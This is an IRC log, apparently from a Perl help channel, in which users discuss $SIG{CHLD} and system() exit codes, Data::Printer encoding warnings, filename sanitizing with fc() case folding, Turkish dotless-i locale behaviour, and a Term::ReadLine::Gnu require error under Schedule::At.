[11:46:54] *** Joins: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3)
[11:51:21] *** Quits: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3) (Ping timeout: 252 seconds)
[12:05:11] *** Joins: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3)
[12:09:29] *** Quits: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3) (Ping timeout: 250 seconds)
[12:11:50] *** Joins: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr)
[12:11:56] *** Quits: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr) (Remote host closed the connection)
[12:13:12] *** Joins: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr)
[12:16:12] *** Quits: deadmarshal_ (~deadmarsh@95.38.230.202) (Ping timeout: 256 seconds)
[12:17:00] *** Joins: magla (~gelignite@55d4a165.access.ecotel.net)
[12:35:59] *** Quits: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr) (Remote host closed the connection)
[12:38:22] *** Joins: kevin-oculus (~tomys@c188-149-14-10.bredband.tele2.se)
[12:38:41] *** Joins: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3)
[12:42:39] <karjala> In the second-to-last example code in this section https://perldoc.pl/perlipc#Signals am I right to believe that there is a chance that the lines after the system(...) call at the end might not be able to see system's exit code? Because the harvesting of system's child process might occur in the $SIG{CHLD} handler, and that only sets the local value of $? there.
[12:42:40] <Paperbot> Link title(s): [ perlipc - Perl interprocess communication (signals, fifos, pipes, safe subprocesses, sockets, and... ]
[12:43:55] *** Quits: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3) (Ping timeout: 250 seconds)
[12:45:05] *** Joins: deadmarshal (~deadmarsh@95.38.230.202)
[12:45:28] *** Quits: rindolf (~shlomif@2a0d:6fc2:4bb1:500:6b1e:2524:3d70:36ec) (Read error: Connection reset by peer)
[12:46:35] * GumbyPAN CPAN Upload: CPAN-2.30-TRIAL by ANDK https://metacpan.org/release/ANDK/CPAN-2.30-TRIAL
[12:54:36] <karjala> Even if the return value of the system(...) call were captured in a variable, what I said above would still hold I think.
[12:56:10] *** Joins: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3)
[12:56:36] * GumbyPAN CPAN Upload: Dancer2-Session-DatabasePlugin-1.0013 by AKALINUX https://metacpan.org/release/AKALINUX/Dancer2-Session-DatabasePlugin-1.0013
[13:00:39] <karjala> To read the exit code of system reliably, one would need to store all the PIDs returned by their fork() calls, and `waitpid $pid, WNOHANG` on each of them separately periodically. Am I right?
[13:01:02] *** Quits: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3) (Ping timeout: 260 seconds)
[13:02:53] *** Joins: rindolf (~shlomif@2a0d:6fc2:4bb1:500:6b1e:2524:3d70:36ec)
[13:08:48] <karjala> In fact, I suspect that since $SIG{CHILD} has been set to something, this would mean that system will never return the exit code. Am I right on that?
[13:09:27] *** Quits: deadmarshal (~deadmarsh@95.38.230.202) (Ping timeout: 252 seconds)
[13:10:41] *** Joins: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr)
[13:11:21] *** Joins: deadmarshal (~deadmarsh@95.38.116.191)
[13:15:02] *** Quits: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr) (Ping timeout: 240 seconds)
[13:15:30] *** Joins: zer0bitz (~zer0bitz@dsl-hkibng32-54fbfb-173.dhcp.inet.fi)
[13:20:14] *** Quits: deadmarshal (~deadmarsh@95.38.116.191) (Ping timeout: 256 seconds)
[13:20:26] *** Joins: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr)
[13:26:33] *** Joins: deadmarshal (~deadmarsh@95.38.116.191)
[13:28:53] *** Joins: jmdaemon (~jmdaemon@user/jmdaemon)
[13:30:07] *** Quits: justSleigh (~justache@user/justache) (Remote host closed the connection)
[13:30:08] *** Joins: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3)
[13:31:02] *** Joins: justSleigh (~justache@user/justache)
[13:34:51] *** Quits: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3) (Ping timeout: 250 seconds)
[13:41:55] *** Joins: proller (~p@80.240.216.69)
[13:44:11] *** Joins: bfr (~bfr@ip-109-43-113-0.web.vodafone.de)
[13:48:35] *** Quits: bfr (~bfr@ip-109-43-113-0.web.vodafone.de) (Read error: Connection reset by peer)
[13:53:29] *** Joins: xenial-user10 (~androirc@3EC97C6F.catv.pool.telekom.hu)
[13:56:58] *** Quits: rgrinberg (~textual@187.223.209.106) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[14:02:18] *** Quits: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr) (Remote host closed the connection)
[14:02:36] *** Joins: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3)
[14:08:00] *** Quits: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3) (Ping timeout: 268 seconds)
[14:08:18] *** Joins: parv (~quass@user/parv)
[14:11:47] *** Joins: zenfold (~zenfold@user/zenfold)
[14:13:11] *** Joins: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr)
[14:13:23] *** Joins: bfr (~bfr@ip-109-43-113-0.web.vodafone.de)
[14:19:20] <karjala> Interesting article. Maybe applies to Perl too: https://blog.filippo.io/professional-maintainers/ - What do you think?
[14:19:20] <Paperbot> Link title(s): [ Professional maintainers: a wake-up call ]
[14:22:02] *** Parts: bfr (~bfr@ip-109-43-113-0.web.vodafone.de) ()
[14:24:15] *** Joins: Pali (~pali@user/pali)
[14:26:46] * GumbyPAN CPAN Upload: Travel-Status-DE-IRIS-1.62 by DERF https://metacpan.org/release/DERF/Travel-Status-DE-IRIS-1.62
[14:27:31] *** Quits: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr) (Remote host closed the connection)
[14:28:11] *** Quits: parv (~quass@user/parv) (Quit: parv)
[14:30:13] *** Quits: csrf (~csrf@user/csrf) (Quit: ZNC 1.7.2+deb3 - https://znc.in)
[14:30:58] *** Joins: csrf (~csrf@user/csrf)
[14:33:51] <Mandevil> Seems like SQLite supports JSON through JSON1 extension. Does DBD::SQLite support that?
[14:35:39] *** Joins: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3)
[14:40:45] *** Quits: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3) (Ping timeout: 252 seconds)
[14:45:00] <Mandevil> I guess that's too new
[14:47:30] <Mandevil> No, the extension is from 2015
[14:53:38] *** Joins: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3)
[14:58:10] *** Quits: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3) (Ping timeout: 260 seconds)
[15:10:04] *** Joins: bfr (~bfr@ip-109-43-113-0.web.vodafone.de)
[15:18:59] *** Joins: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr)
[15:23:22] *** Quits: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr) (Ping timeout: 260 seconds)
[15:32:43] *** Joins: MaterazziSan (~Materazzi@105.76.134.37.dynamic.jazztel.es)
[15:32:46] *** Parts: strk (~strk@user/strk) (WeeChat 3.3)
[15:35:44] *** Joins: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3)
[15:41:35] *** Quits: xenial-user10 (~androirc@3EC97C6F.catv.pool.telekom.hu) (Ping timeout: 250 seconds)
[16:08:14] *** Quits: MaterazziSan (~Materazzi@105.76.134.37.dynamic.jazztel.es) (Quit: ¡Hasta luego! See you!)
[16:17:42] *** Quits: The_Blode (~Blode@user/the-blode/x-7164444) (Read error: Connection reset by peer)
[16:27:05] *** Quits: jmdaemon (~jmdaemon@user/jmdaemon) (Quit: WeeChat 3.3)
[16:31:30] *** Quits: deadmarshal (~deadmarsh@95.38.116.191) (Ping timeout: 260 seconds)
[16:40:27] *** Quits: bfr (~bfr@ip-109-43-113-0.web.vodafone.de) (Remote host closed the connection)
[16:41:29] *** Joins: bfr (~bfr@ip-109-43-113-0.web.vodafone.de)
[16:41:48] *** Quits: bfr (~bfr@ip-109-43-113-0.web.vodafone.de) (Remote host closed the connection)
[16:45:38] *** Joins: deadmarshal (~deadmarsh@95.38.116.191)
[16:52:40] *** Quits: deadmarshal (~deadmarsh@95.38.116.191) (Ping timeout: 268 seconds)
[16:53:24] *** Joins: deadmarshal (~deadmarsh@95.38.116.191)
[16:56:30] *** Joins: monkey_ (~user@190.104.116.153)
[17:07:48] *** Joins: bfr (~bfr@ip-109-43-113-0.web.vodafone.de)
[17:07:48] *** Quits: bfr (~bfr@ip-109-43-113-0.web.vodafone.de) (Remote host closed the connection)
[17:12:01] <Mandevil> https://l.perl.bot/p/toimev ... I'm getting "wide character in Data::Printer" warning. Is that DP's fault?
[17:12:02] <Paperbot> Link title(s): [ Perlbot Pastebin ]
[17:13:46] <huf> Mandevil: it prints to STDERR
[17:13:47] <huf> not OUT
[17:13:51] <huf> you're binmoding the wrong thing
[17:14:08] <Mandevil> Oh!
[17:14:35] <huf> also, isnt it supposed to be :encoding(UTF-8)?
[17:15:13] <Mandevil> Yeah, sorry.
[17:15:18] <Mandevil> It doesn't complain, though
[17:15:28] <huf> no, it wont complain
[17:15:43] <huf> but utf8 is perl's internal sort-of utf8 thing
[17:15:56] <huf> it shouldnt matter unless you're printing something that wouldnt be valid UTF-8
[17:16:07] <huf> but i'm hazy on exactly how to show the difference
[17:19:47] <Mandevil> This apparently works too: use Data::Printer output => 'stdout';
[17:21:26] *** Quits: deadmarshal (~deadmarsh@95.38.116.191) (Ping timeout: 260 seconds)
[17:37:14] *** Joins: deadmarshal (~deadmarsh@95.38.116.191)
[17:42:01] *** Joins: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr)
[17:42:03] *** Joins: dextercd (~dexter@2a02-a450-f25d-1-76d4-35ff-fefe-34c.fixed6.kpn.net)
[18:03:42] *** Quits: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr) (Remote host closed the connection)
[18:04:36] <simcop2387> Mandevil: if you aren't seeing it let me know, i've got some experience building external extensions for SQLite for use with DBD::SQLite
[18:09:08] *** Quits: deadmarshal (~deadmarsh@95.38.116.191) (Ping timeout: 268 seconds)
[18:13:52] *** Joins: kitsunenokenja (~kitsunech@68.91.220.96)
[18:15:44] *** Quits: CrazyEddy (crazyed@2603:300a:1d10:c000:de4a:3eff:fe88:cc5f) (Remote host closed the connection)
[18:34:55] *** Joins: bfr (~bfr@ip-109-43-113-0.web.vodafone.de)
[18:36:30] *** Quits: bfr (~bfr@ip-109-43-113-0.web.vodafone.de) (Remote host closed the connection)
[18:37:35] *** Joins: fwg (~fwg@user/fwg)
[18:39:13] *** Joins: bfr (~bfr@ip-109-43-113-0.web.vodafone.de)
[18:43:34] *** Parts: bfr (~bfr@ip-109-43-113-0.web.vodafone.de) ()
[18:44:04] <karjala> How can I match only printable unicode characters? or alternatively, match those characters that aren't printed, like x00-x019 and x80-x99?
[18:44:28] <karjala> I want to sanitize a filename parameter, basically
[18:45:30] <karjala> (What's the way to sanitize filenames, so that they don't contain weird characters?)
[18:46:07] *** Quits: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3) (Ping timeout: 268 seconds)
[18:46:51] *** Joins: sprout (~quassel@2a02:a467:ccd6:1:558b:2015:9c55:ace3)
[18:50:27] *** Joins: CrazyEddy (crazyed@2603:300a:1d10:c000:de4a:3eff:fe88:cc5f)
[18:52:15] * GumbyPAN CPAN Upload: MarpaX-ESLIF-6.0.2-TRIAL by JDDPAUSE https://metacpan.org/release/JDDPAUSE/MarpaX-ESLIF-6.0.2-TRIAL
[18:55:13] <simcop2387> karjala: depends on your requirements, on linux the only character not allowed is /, and there's no encoding to filenames (in the normal case, you can configure and format ext4 and some other filesystems to use utf8 and support case folding).  if you want to sanitize and normalize filenames i would probably recommend something like: convert to NFC for normalization, and then also case fold them
[18:55:20] <simcop2387> with fc().  as far as removing funky characters i'm not sure
[18:55:51] *** Joins: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr)
[18:58:26] <karjala> simcop2387: Thanks. Never understood what fc() really is. Does it return a value that I can use, or is the value usable only to compare with other fc() return values?
[18:59:07] <simcop2387> fc() is like uc() and lc(), but it does "the right thing" with regard to certain unicode situations
[18:59:28] <simcop2387> it's sort of similar to what you'd get doing lc(uc($str))
[19:00:15] <karjala> Does this mean the output of fc is all-lowercase characters?
[19:00:21] <simcop2387> so it will be a new string, that has consistent case for all the characters in it, which if you're making a name for a human to use later, will generally be what the human wants.
[19:00:49] <karjala> ok, thanks
[19:01:31] <simcop2387> eval: my $s="hello world! HELLO WORLD! \N{LATIN SMALL LETTER SHARP S}"; [$s, lc($s), uc($s), fc($s)]
[19:01:34] <perlbot> simcop2387: ["hello world! HELLO WORLD! \x{df}","hello world! hello world! \x{df}","HELLO WORLD! HELLO WORLD! SS","hello world! hello world! ss"]
[19:03:12] <karjala> Thanks
[19:07:28] <zgu> oh yeah ß only exists as lowercase
[19:08:28] *** Quits: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr) (Remote host closed the connection)
[19:08:38] <simcop2387> zgu: yea it's one of the fun situations.  there's others too but i don't know them.
[19:10:38] *** Quits: waltman (waltman@2601:4a:701:4451:2168:4246:f8a0:bb4e) (Quit: leaving)
[19:12:43] <fizzie> The Turkic "dotless i" is the other canonically tricky situation; there's lowercase ı for uppercase I and uppercase İ for lowercase i -- slightly different in that there's nothing missing, but of course generally people expect uppercase I for lowercase i.
[19:28:45] *** Joins: waltman (waltman@2601:4a:701:4451:2832:c501:4498:a347)
[19:40:14] *** Joins: slowButPresent (~slowButPr@user/slowbutpresent)
[19:47:04] *** Joins: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr)
[19:49:25] *** Joins: xenial-user10 (~androirc@20014C4C17E1D20002094CFFFE807190.catv.pool.telekom.hu)
[19:50:13] *** Quits: kitsunenokenja (~kitsunech@68.91.220.96) (Ping timeout: 252 seconds)
[19:50:21] <ilmari> basheval: LC_ALL=tr_TR.utf8 perl -CS -E 'use locale; say map +(uc,lc), qw(i I)'
[19:50:23] <perlbot> ilmari: İiIı␤
[19:50:47] <ilmari> basheval: LC_ALL=tr_TR.utf8 perl -CS -E 'say map +(uc,lc), qw(i I)'
[19:50:48] <perlbot> ilmari: IiIi␤
[19:51:42] *** Quits: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr) (Ping timeout: 260 seconds)
[19:53:29] *** Quits: PancakeMatsuri (~textual@122-57-178-216-fibre.sparkbb.co.nz) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[19:55:50] <Mandevil> Turkic dotless i was a terrible idea.
[19:56:20] <Mandevil> What were they thinking?
[19:58:49] <ilmari> ask kemal atatürk
[20:09:57] *** Joins: jiggawatt (jiggawatt@runs.on.ubuntu.crapping.cricket)
[20:10:37] <jiggawatt> how many jiggadollars can I expect becoming a Pro Perl programmer
[20:10:47] <jiggawatt> does it add marketable value
[20:16:23] * GumbyPAN CPAN Upload: Slovo-2021.12.12 by BEROV https://metacpan.org/release/BEROV/Slovo-2021.12.12
[20:25:42] *** Quits: bedroller (~fling@user/fling) (Quit: ZNC 1.8.2+deb2+b1 - https://znc.in)
[20:26:42] <ology> jiggawatt: https://www.ziprecruiter.com/Salaries/Perl-Developer-Salary maybe
[20:26:42] <Paperbot> Link title(s): [ Perl Developer Annual Salary ($118,335 Avg | Nov 2021) - ZipRecruiter ]
[20:28:07] *** Joins: MaterazziSan (~Materazzi@24.135.203.113.dynamic.jazztel.es)
[20:29:29] *** Quits: MaterazziSan (~Materazzi@24.135.203.113.dynamic.jazztel.es) (Client Quit)
[20:29:46] *** Joins: MaterazziSan (~Materazzi@24.135.203.113.dynamic.jazztel.es)
[20:34:28] *** Joins: G_SabinoMullane (~G_SabinoM@pool-72-94-251-236.phlapa.fios.verizon.net)
[20:38:00] *** Joins: fling (~fling@user/fling)
[20:48:00] <jiggawatt> wow not bad
[20:48:01] <jiggawatt> cheers ology 
[20:50:19] *** Quits: MaterazziSan (~Materazzi@24.135.203.113.dynamic.jazztel.es) (Quit: ¡Hasta luego! See you!)
[20:50:36] *** Joins: MaterazziSan (~Materazzi@24.135.203.113.dynamic.jazztel.es)
[21:08:43] *** Joins: deadmarshal (~deadmarsh@95.38.116.191)
[21:18:04] *** Joins: radu242407 (~radu242@pool-96-250-79-242.nycmny.fios.verizon.net)
[21:20:55] *** Quits: a6502__ (~wieger@stofzuiger.a6502.net) (Quit: bereboot)
[21:25:04] *** Joins: PancakeMatsuri (~textual@122-57-178-216-fibre.sparkbb.co.nz)
[21:26:38] *** Joins: bn_work (uid268505@id-268505.uxbridge.irccloud.com)
[21:29:09] *** Quits: PancakeMatsuri (~textual@122-57-178-216-fibre.sparkbb.co.nz) (Client Quit)
[21:35:57] *** Joins: PancakeMatsuri (~textual@122-57-178-216-fibre.sparkbb.co.nz)
[21:45:02] *** Quits: xenial-user10 (~androirc@20014C4C17E1D20002094CFFFE807190.catv.pool.telekom.hu) (Ping timeout: 240 seconds)
[21:46:10] *** Joins: xenial-user10 (~androirc@3EC97C6F.catv.pool.telekom.hu)
[21:59:08] *** Joins: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr)
[22:07:29] *** Quits: G_SabinoMullane (~G_SabinoM@pool-72-94-251-236.phlapa.fios.verizon.net) (Ping timeout: 250 seconds)
[22:12:15] *** Quits: PancakeMatsuri (~textual@122-57-178-216-fibre.sparkbb.co.nz) (Quit: Textual IRC Client: www.textualapp.com)
[22:15:42] *** Quits: fwg (~fwg@user/fwg) (Quit: .oO( zzZzZzz ...)
[22:15:47] *** Quits: zer0bitz (~zer0bitz@dsl-hkibng32-54fbfb-173.dhcp.inet.fi) (Ping timeout: 268 seconds)
[22:18:19] *** Quits: radu242407 (~radu242@pool-96-250-79-242.nycmny.fios.verizon.net) (Ping timeout: 250 seconds)
[22:20:04] *** Joins: aquanight (~aquanight@174-126-159-166.cpe.sparklight.net)
[22:28:24] *** Joins: jaytee80 (~jaytee80@206.208.33.20)
[22:29:38] <jaytee80> So I use Schedule::At, and have for a long time now. Right now, it's doing strange things. 1. it doesn't put a newline on the command so the bash barfs. Easy enough to work around. But the show stopper now is a real head scratcher.
[22:29:39] *** Joins: ledestin (~ledestin@122-57-178-216-fibre.sparkbb.co.nz)
[22:30:40] <jaytee80> I have it running a perl program, and that program works perfectly from the command line. But if it's run in Schedule::At by the at daemon, then I get an error on a require Term::Readline::Gnu; statement, saying attempt to reload the file aborted.
[22:30:58] *** Quits: ledestin (~ledestin@122-57-178-216-fibre.sparkbb.co.nz) (Client Quit)
[22:31:41] *** Joins: ledestin (~ledestin@122-57-178-216-fibre.sparkbb.co.nz)
[22:33:18] *** Quits: ledestin (~ledestin@122-57-178-216-fibre.sparkbb.co.nz) (Client Quit)
[22:33:35] *** Joins: PancakeMatsuri (~PancakeMa@122-57-178-216-fibre.sparkbb.co.nz)
[22:35:03] <Altreus> I've seen that ... I think it happens when the module fails to load, but does not cause a fatal error in doing so; the next time Perl tries to load it, it says no, I already tried that
[22:36:48] <jaytee80> I only have one require line, and it fails right on that statement. Curious why it wouldn't load the first time, and why it was attempted again.
[22:37:38] *** Parts: PancakeMatsuri (~PancakeMa@122-57-178-216-fibre.sparkbb.co.nz) ()
[22:38:17] <jaytee80> I do recall having issues getting Term::ReadLine::Gnu installed on this system. I should probably go back and look at that.
[22:39:21] *** Joins: radu242407 (~radu242@pool-96-250-79-242.nycmny.fios.verizon.net)
[22:46:32] *** Quits: MaterazziSan (~Materazzi@24.135.203.113.dynamic.jazztel.es) (Quit: ¡Hasta luego! See you!)
[22:46:39] * GumbyPAN CPAN Upload: App-Easer-0.007002-TRIAL by POLETTIX https://metacpan.org/release/POLETTIX/App-Easer-0.007002-TRIAL
[22:47:29] <Altreus> why is it require and not use?
[22:47:41] *** Quits: deadmarshal (~deadmarsh@95.38.116.191) (Ping timeout: 252 seconds)
[22:48:57] <jaytee80> I'm sure I knew when I wrote this code in like 2006... but now only God knows.
[22:50:14] *** Quits: radu242407 (~radu242@pool-96-250-79-242.nycmny.fios.verizon.net) (Read error: Connection reset by peer)
[22:50:14] <jaytee80> Something on the lines of I want to use Term::ReadLine, but somehow want to force it to use the Gnu flavor. Next line in the code is 'use Term::ReadLine'.
[22:50:19] *** Joins: radu242407 (~radu242@pool-96-250-79-242.nycmny.fios.verizon.net)
[22:50:54] *** Joins: MaterazziSan (~Materazzi@24.135.203.113.dynamic.jazztel.es)
[22:54:19] *** Joins: xenial-user5 (~androirc@3EC97C6F.catv.pool.telekom.hu)
[22:55:47] *** Quits: xenial-user10 (~androirc@3EC97C6F.catv.pool.telekom.hu) (Ping timeout: 250 seconds)
[22:59:39] *** Quits: radu242407 (~radu242@pool-96-250-79-242.nycmny.fios.verizon.net) (Read error: Connection reset by peer)
[23:00:03] *** Joins: radu2424078 (~radu242@pool-96-250-79-242.nycmny.fios.verizon.net)
[23:03:13] *** Quits: MaterazziSan (~Materazzi@24.135.203.113.dynamic.jazztel.es) (Quit: ¡Hasta luego! See you!)
[23:03:19] *** Quits: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr) (Read error: Connection reset by peer)
[23:03:42] *** Joins: ovid_ (~ovid@laubervilliers-659-1-13-124.w80-11.abo.wanadoo.fr)
[23:03:54] *** Quits: gizmomathboy (~gizmomath@206.127.53.107) (Ping timeout: 268 seconds)
[23:07:10] <jaytee80> Well, just removing the require line completely solves the issue.
[23:08:26] *** Joins: rgrinberg (~textual@187.223.209.106)
[23:08:45] *** Quits: radu2424078 (~radu242@pool-96-250-79-242.nycmny.fios.verizon.net) (Read error: Connection reset by peer)
[23:11:49] *** Joins: MaterazziSan (~Materazzi@24.135.203.113.dynamic.jazztel.es)
[23:15:33] *** Quits: rindolf (~shlomif@2a0d:6fc2:4bb1:500:6b1e:2524:3d70:36ec) (Ping timeout: 252 seconds)
[23:17:09] *** Joins: gizmomathboy (~gizmomath@206.127.53.107)
[23:20:36] *** Quits: yanmaani (~yanmaani@gateway/tor-sasl/yanmaani) (Ping timeout: 276 seconds)
[23:21:06] *** Joins: yanmaani (~yanmaani@gateway/tor-sasl/yanmaani)
[23:28:02] <Altreus> fixed :D
[23:37:21] *** Joins: krismatrix (~krismatri@38.80.149.51)
[23:41:17] *** Joins: radu2424078 (~radu242@pool-96-250-79-242.nycmny.fios.verizon.net)
[23:43:59] *** Quits: xenial-user5 (~androirc@3EC97C6F.catv.pool.telekom.hu) (Ping timeout: 268 seconds)
[23:44:19] *** Joins: zacts (~zacts@user/zacts)
[23:46:36] *** Quits: radu2424078 (~radu242@pool-96-250-79-242.nycmny.fios.verizon.net) (Quit: The Lounge - https://thelounge.chat)
[23:47:54] *** Joins: radu2424078 (~radu242@pool-96-250-79-242.nycmny.fios.verizon.net)
[23:52:31] *** Quits: radu2424078 (~radu242@pool-96-250-79-242.nycmny.fios.verizon.net) (Read error: Connection reset by peer)
[23:56:47] * GumbyPAN CPAN Upload: Dir-Split-0.81 by SCHUBIGER https://metacpan.org/release/SCHUBIGER/Dir-Split-0.81
[23:59:39] *** Joins: deadmarshal (~deadmarsh@95.38.116.191)
